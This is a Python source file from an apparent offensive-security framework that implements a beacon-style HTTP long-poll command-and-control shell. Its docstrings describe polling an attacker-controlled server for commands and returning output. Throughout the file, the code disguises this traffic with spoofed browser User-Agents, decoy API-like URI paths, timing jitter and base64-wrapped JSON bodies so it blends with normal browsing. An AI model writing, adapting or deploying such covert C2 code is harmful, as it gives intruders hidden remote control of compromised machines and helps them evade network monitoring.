"""HTTP long-poll shell engine - beacon-based C2.

The agent periodically polls an attacker-controlled HTTP server for
pending commands and posts execution output back.  Configurable jitter,
legitimate User-Agent strings, and randomized URI paths make the traffic
blend with normal web browsing.

Author: Andre Henrique (LinkedIn/X: @mrhenrike)
Version: 0.1.0
"""

from __future__ import annotations

import base64
import http.client
import json
import logging
import random
import secrets
import ssl
import threading
import time
import urllib.parse
from typing import Dict, List, Optional, Tuple

from embedxpl.core.shells.shell_engine import (
    ShellConnectionError,
    ShellEngine,
    ShellIOError,
    ShellStatus,
    ShellTimeoutError,
)

logger = logging.getLogger(__name__)

_USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
]

_POLL_PATHS: List[str] = [
    "/api/v1/status",
    "/api/v2/health",
    "/cdn/assets/check",
    "/static/analytics",
    "/updates/check",
    "/telemetry/collect",
    "/api/config/sync",
    "/feed/latest",
]


class HTTPPollShell(ShellEngine):
    """Beacon-based HTTP long-poll C2 shell.

    The operator runs an HTTP server.  This engine (on the operator side)
    queues commands for the agent to fetch and receives output from POST
    requests.

    Communication flow:
        1. Agent polls ``GET <base_url>/<random_path>?s=<session>``
        2. Server returns pending command (or empty 204)
        3. Agent executes command, POSTs output to
           ``POST <base_url>/<random_path>``

    Traffic mimics legitimate API calls with realistic headers, random
    URI paths, and configurable jitter.

    Args:
        remote_host: HTTP server hostname or IP.
        remote_port: HTTP server port (80 or 443).
        timeout: HTTP request timeout in seconds.
        use_tls: Use HTTPS when True.
        base_path: Optional fixed URL prefix (e.g. "/api").
        poll_interval: Base interval between polls in seconds.
        jitter: Maximum random jitter added to poll_interval (seconds).
        session_id: Override auto-generated session identifier.
    """

    def __init__(
        self,
        remote_host: str,
        remote_port: int = 80,
        timeout: float = 30.0,
        use_tls: bool = False,
        base_path: str = "",
        poll_interval: float = 5.0,
        jitter: float = 2.0,
        session_id: Optional[str] = None,
    ) -> None:
        super().__init__(
            remote_host=remote_host,
            remote_port=remote_port,
            transport_type="http_poll",
            timeout=timeout,
        )
        self._use_tls: bool = use_tls
        self._base_path: str = base_path.rstrip("/")
        self._poll_interval: float = max(0.5, poll_interval)
        self._jitter: float = max(0.0, jitter)
        self._session_id: str = session_id or secrets.token_hex(8)
        self._user_agent: str = random.choice(_USER_AGENTS)
        self._pending_cmds: List[str] = []
        self._received_output: List[str] = []
        self._lock: threading.Lock = threading.Lock()
        self._conn: Optional[http.client.HTTPConnection] = None

    # ------------------------------------------------------------------
    # Properties
    # ------------------------------------------------------------------

    @property
    def session_id(self) -> str:
        """Current session identifier."""
        return self._session_id

    # ------------------------------------------------------------------
    # Connection
    # ------------------------------------------------------------------

    def connect(self) -> bool:
        """Establish an HTTP(S) connection to the C2 server.

        Returns:
            True on success.

        Raises:
            ShellConnectionError: If the server is unreachable.
        """
        self._set_status(ShellStatus.CONNECTING)
        try:
            self._conn = self._create_connection()
            self._conn.connect()
            self._set_status(ShellStatus.CONNECTED)
            logger.info(
                "HTTP poll shell connected to %s:%d (tls=%s, session=%s)",
                self._remote_host,
                self._remote_port,
                self._use_tls,
                self._session_id,
            )
            return True
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellConnectionError(str(exc)) from exc

    def _create_connection(self) -> http.client.HTTPConnection:
        """Create an HTTP or HTTPS connection object."""
        if self._use_tls:
            ctx = ssl.create_default_context()
            return http.client.HTTPSConnection(
                self._remote_host,
                self._remote_port,
                timeout=self._timeout,
                context=ctx,
            )
        return http.client.HTTPConnection(
            self._remote_host,
            self._remote_port,
            timeout=self._timeout,
        )

    # ------------------------------------------------------------------
    # I/O
    # ------------------------------------------------------------------

    def send(self, cmd: str) -> int:
        """Send a command to the C2 server via HTTP POST.

        The command is base64-encoded in a JSON body to blend with
        typical API traffic.

        Args:
            cmd: Command string.

        Returns:
            Number of original command bytes.

        Raises:
            ShellIOError: On HTTP failures.
        """
        self._require_connected()
        raw = cmd.strip().encode("utf-8", errors="replace")
        body = json.dumps({
            "s": self._session_id,
            "d": base64.b64encode(raw).decode("ascii"),
            "t": int(time.time()),
        }).encode("utf-8")

        path = self._random_path()
        headers = self._request_headers()
        headers["Content-Type"] = "application/json"
        headers["Content-Length"] = str(len(body))

        try:
            self._ensure_connection()
            self._conn.request("POST", path, body=body, headers=headers)  # type: ignore[union-attr]
            resp = self._conn.getresponse()  # type: ignore[union-attr]
            resp.read()
            if resp.status >= 400:
                raise ShellIOError("HTTP POST returned {}".format(resp.status))
            logger.debug("POST %s -> %d", path, resp.status)
            return len(raw)
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellIOError(str(exc)) from exc

    def recv(self, timeout: Optional[float] = None) -> str:
        """Poll the C2 server for output via HTTP GET.

        Args:
            timeout: Override default timeout.

        Returns:
            Decoded output (empty if none available).

        Raises:
            ShellIOError: On HTTP failures.
        """
        self._require_connected()
        wait = timeout if timeout is not None else self._timeout
        deadline = time.monotonic() + wait

        while time.monotonic() < deadline:
            path = self._random_path()
            params = urllib.parse.urlencode({"s": self._session_id})
            full_path = "{}?{}".format(path, params)
            headers = self._request_headers()

            try:
                self._ensure_connection()
                self._conn.request("GET", full_path, headers=headers)  # type: ignore[union-attr]
                resp = self._conn.getresponse()  # type: ignore[union-attr]
                body = resp.read()
            except OSError as exc:
                self._set_status(ShellStatus.ERROR, str(exc))
                raise ShellIOError(str(exc)) from exc

            if resp.status == 204 or not body:
                remaining = deadline - time.monotonic()
                sleep_time = self._poll_interval + random.uniform(0, self._jitter)
                if remaining > sleep_time:
                    time.sleep(sleep_time)
                    continue
                break

            return self._decode_response(body)

        return ""

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def close(self) -> None:
        """Close the HTTP connection."""
        if self._conn is not None:
            try:
                self._conn.close()
            except OSError:
                pass
        self._conn = None
        self._set_status(ShellStatus.DISCONNECTED)
        logger.info("HTTPPollShell closed (session=%s)", self._session_id)

    def is_alive(self) -> bool:
        """Check if the HTTP connection is usable."""
        if self._status != ShellStatus.CONNECTED or self._conn is None:
            return False
        try:
            self._conn.request(
                "HEAD",
                self._random_path(),
                headers=self._request_headers(),
            )
            resp = self._conn.getresponse()
            resp.read()
            return resp.status < 500
        except OSError:
            return False

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _random_path(self) -> str:
        """Generate a random URI path from the pool."""
        base = random.choice(_POLL_PATHS)
        return "{}{}".format(self._base_path, base)

    def _request_headers(self) -> Dict[str, str]:
        """Build realistic HTTP request headers."""
        return {
            "User-Agent": self._user_agent,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
        }

    def _ensure_connection(self) -> None:
        """Reconnect if the underlying socket was closed."""
        try:
            if self._conn is not None and self._conn.sock is not None:
                return
        except AttributeError:
            pass
        self._conn = self._create_connection()
        self._conn.connect()

    @staticmethod
    def _decode_response(body: bytes) -> str:
        """Decode a JSON-wrapped base64 response body.

        Falls back to raw UTF-8 if the response is not in the expected
        format.

        Args:
            body: Raw HTTP response body bytes.

        Returns:
            Decoded output string.
        """
        try:
            payload = json.loads(body)
            if isinstance(payload, dict) and "d" in payload:
                return base64.b64decode(payload["d"]).decode("utf-8", errors="replace")
        except (json.JSONDecodeError, KeyError, ValueError):
            pass
        return body.decode("utf-8", errors="replace")

    def _require_connected(self) -> None:
        if self._status != ShellStatus.CONNECTED or self._conn is None:
            raise ShellIOError(
                "Shell not connected (status={})".format(self._status.value)
            )
